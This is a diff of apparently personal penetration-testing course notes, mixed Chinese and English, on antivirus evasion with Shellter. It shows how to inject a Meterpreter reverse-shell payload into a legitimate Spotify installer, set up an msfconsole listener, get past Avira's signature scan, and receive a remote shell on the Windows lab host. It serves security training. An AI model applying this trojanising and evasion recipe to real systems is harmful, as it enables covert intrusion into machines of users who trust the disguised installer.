@@ -3023,8 +3023,8 @@ client01
 ### Automating the Process
 
 [Shellter](https://www.shellterproject.com/homepage/) 用於在 Windows 平台上進行可執行檔案的 Dynamic Shellcode Injection。主要用於將惡意 shellcode 注入合法的可執行檔案中，使得該檔案在外觀和行為上仍看似正常，但內部執行時會執行 shellcode。\
-Shellter attempts to use the existing PE Import Address Table (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.
-
+Shellter attempts to use the existing PE Import Address Table (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.\
+(Kali)
 ```
 ┌──(chw㉿CHW-kali)-[~]
 └─$ apt-cache search shellter
@@ -3039,4 +3039,86 @@ shellter - Dynamic shellcode injection tool and dynamic PE infector
 root@kali:~# dpkg --add-architecture i386 && apt-get update &&
 apt-get install wine32
 ```
+> 由於 Shellter 是基於 Windows 的工具，需使用 Wine 來讓 Shellter 能夠在 POSIX 系統（如 Kali Linux 或 macOS）上運行
+
+(Mac)
+```
+CWei@CHW-MacBook-Pro % brew install --cask wine-stable
+...
+CWei@CHW-MacBook-Pro % cd shellter/
+CWei@CHW-MacBook-Pro shellter % ls
+Executable_SHA-256.txt	docs			licenses		shellcode_samples	shellter.exe
+CWei@CHW-MacBook-Pro shellter % wine shellter.exe
+zsh: killed     wine shellter.exe
+```
+
 ![image](https://hackmd.io/_uploads/Byi8oe_vyx.png)
+1. Shellter 提供兩種模式：\
+Auto 模式（自動模式）：適合快速注入，對於大多數情境足夠。
+Manual 模式（手動模式）：用於細化操作，如自訂注入參數。
+
+準備目標 PE file，範例使用合法的 Windows 可執行文件（Spotify 安裝程式 spotifysetup.exe)
+![image](https://hackmd.io/_uploads/r18E0H5Pkg.png)
+> PE target: 目標文件路徑\
+> Backup: 建立備份
+
+2. 是否要啟用Stealth Mode
+此模式可在 payload 執行後恢復 PE 的執行流程
+![image](https://hackmd.io/_uploads/ryk6RS5wJe.png)
+
+3. 使用有效 payload
+為了測試 Shellter 的繞過功能，我們將使用 Avira 在本模組開頭偵測到的反向 shell 負載的 Meterpreter 版本\
+
+>[!Note]
+> Meterpreter 是一種由 Metasploit 框架提供的 backdoor 工具。它是一個強大的 payload，能夠在目標系統上執行各種命令，並且提供豐富的功能來控制目標機器。\
+> ([Offsec](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)) Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime.
+
+![image](https://hackmd.io/_uploads/rkDrh8qP1x.png)
+> 輸入 L 列出 payload，然後選擇合適的選項\
+> 輸入 reverse shell host (LHOST) and port (LPORT)
+>> Injection: Verified!
+
+4. 在 Kali 設置 Meterpreter 監聽
+啟動 msfconsole，設置 Meterpreter 監聽
+
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+...
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+LHOST => 192.168.50.1
+LPORT => 443
+[*] Started reverse TCP handler on 192.168.50.1:443
+```
+
+5. Windows 測試 PE file
+![image](https://hackmd.io/_uploads/B1EXgPcwJg.png)\
+因為 Shellter 在 injection PE 之前已經進行混淆，因此 Avira 基於簽章的掃描可以乾淨地運行。它不認為二進位檔案是惡意的。
+
+6. 啟動 PE file (Spotify installer)
+成功收到 Meterpreter shell
+```
+...
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+LHOST => 192.168.50.1
+LPORT => 443
+[*] Started reverse TCP handler on 192.168.50.1:443
+[*] Sending stage (175174 bytes) to 192.168.50.62
+[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)...
+
+meterpreter > shell
+Process 6832 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.739]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\CHW\Desktop>whoami
+whoami
+client01\CHW
+```
+
+# Password Attacks
+## Attacking Network Services Logins
+### 1. SSH and RDP logins
